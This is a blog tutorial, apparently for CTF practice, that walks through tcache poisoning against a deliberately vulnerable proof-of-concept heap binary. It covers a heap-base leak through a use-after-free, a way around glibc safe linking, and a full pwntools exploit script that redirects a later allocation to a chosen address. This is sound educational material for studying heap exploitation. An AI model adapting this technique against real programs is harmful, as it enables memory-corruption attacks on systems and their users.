---
layout: post
title:  "Tcache-Poison"
date:   2025-08-13 06:50:19 +0200
hidden: true
---
### Description
Tcache poisoning is a common heap exploitation technique in CTFs. It involves overwriting the next ptr of a free tcache chunk to decide where the following chunk will be allocated. You can understand more about tcache poisoning by clicking this link: [how2heap](https://github.com/shellphish/how2heap/tree/master/glibc_2.39). You will need to compile and examine the desired binary to better understand how the heap works. To visualize the heap in pwndbg we will use the 'vis' command.<br>
At the bottom of this page you will see the full exploit script that demonstrates a tcache poison on the a POC binary. You can use the already defined functions to interact with the binary or implement them yourself.

### Video
This blog post features a video at the following [link](https://youtu.be/miaxqpKbq8U) <br>
The video is intended for a more thourough walkthrough than the post itself.

### Walkthrough
Using the POC binary, we will allocate and free a chunk and with the UAF bug we will leak the ptr that it contains. Since there is no other free chunk in the particular tcache bin, the ptr mangling (safe linking) that modern libc tcache employs will not be very effective and we can use the leak to calculate the heap base address. This is very important since it will allow us to calculate where future heap allocations are, enabling us to circumvent the safe linking for future allocations.<br>
Allocate and free a chunk:<br>
<img src="/assets/images/tcache-poisoning/tcache0.png" style="width:100%; height:100%;" />
And in the tcache metadata we will see:<br>
<img src="/assets/images/tcache-poisoning/tcache1.png" style="width:100%; height:100%;" />

Address 0x555555559010 holds the value 0x1, meaning that there is 1 free chunk in the 0x50 tcache bin.<br>
Address 0x5555555590a8 holds the ptr to the user data of the chunk at the head of the 0x50 tcache bin.<br>

As you can see there is a lot of similarity between the ptr contained in the free chunk and the heap base addr. To make things clearer, the heap starts at 0x555555559000 <br>
So if we leak the ptr in the free chunk and left shift it by 12 bits we will have the same value as the heap base address. The following python code achieves this:
```
# allocate chunk0
p = b"A"*8
malloc(0, 0x40, p)

# free chunk0
free(0)

# leak heap base via chunk 0
heap_leak = puts(0)
heap_leak = heap_leak[:8]
heap_leak = u64(heap_leak.ljust(8,b"\x00"))
heap_base = heap_leak << 12
print("heap_base:",hex(heap_base))
```
This should give you the following output:
```
heap_base: 0x555555559000
[*] Switching to interactive mode
MENU:
1: Malloc
2: Free
3: Edit
4: Print
> $  
```

Now we need to allocate two chunks, free them and then overwrite the next ptr of the last freed chunk. Something along the lines of:<br>
- allocate chunk0 and chunk1
- free chunk1 and then chunk0
- calculate the safe_link mangling using the addr of chunk0 and the target addr
- allocate chunk0 again and then chunk1 which now points to an attacker controlled destination
<br>

Allocation, freeing and overwriting:<br>
<img src="/assets/images/tcache-poisoning/tcache3.png" style="width:100%; height:100%;" />

Allocating again:<br>
<img src="/assets/images/tcache-poisoning/tcache4.png" style="width:100%; height:100%;" />

Full exploit POC with comments:
```
#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF("program")

gs = '''
c
'''

context.arch = 'amd64'

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, aslr=False)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path, close_fds=False)

#shellcode = asm('\n'.join([
    
#]))

def safe_link(home, target):
    return (home >> 12) ^ target

def malloc(index: int, size: int, payload: bytes):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendlineafter(b"> ", str(size).encode())
    io.sendafter(b"> ", payload)

def free(index: int):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(index).encode())

def edit(index: int, payload: bytes):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendafter(b"> ", payload)

def puts(index: int):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", str(index).encode())
    io.recvuntil(b"> ")
    leak = io.recvline().strip(b"\n")
    return leak

io = start()

# allocate chunk0
p = b"A"*8
malloc(0, 0x40, p)

# free chunk0
free(0)

# leak heap base via chunk 0
heap_leak = puts(0)
heap_leak = heap_leak[:8]
heap_leak = u64(heap_leak.ljust(8,b"\x00"))
heap_base = heap_leak << 12
print("heap_base:",hex(heap_base))

# allocate the chunk again and allocate another one of the same size
malloc(1, 0x40, p)
malloc(2, 0x40, p)

# free chunk2 and then chunk1
# this will cause: chunk1 -> chunk2
free(2)
free(1)

# edit the ptr in chunk1 -> target
# when doing this, we need to know the address of chunk1 so we can use
# the safe_link function
# I call the function that contains the ptr the 'home' chunk
# By inspecting the heap we can see that the home chunk is at
# offset 0x2a0 from the heap base address
home = heap_base + 0x2a0
# We will just target heap_base + 0x100 to demonstrate
# It is important that the address is read/writable and that it is
# 16 byte aligned, meaning the last character of the address
# should be '0' and not '8' or something else
target = heap_base + 0x100
addr = safe_link(home, target)
p = p64(addr)
edit(1, p)

# next up we allocate chunk1 again and then we allocate chunk2
# which was manipulated by us to point
# to heap_base+0x100
malloc(3, 0x40, b"B")
malloc(4, 0x40, b"XXXX")

io.interactive()

```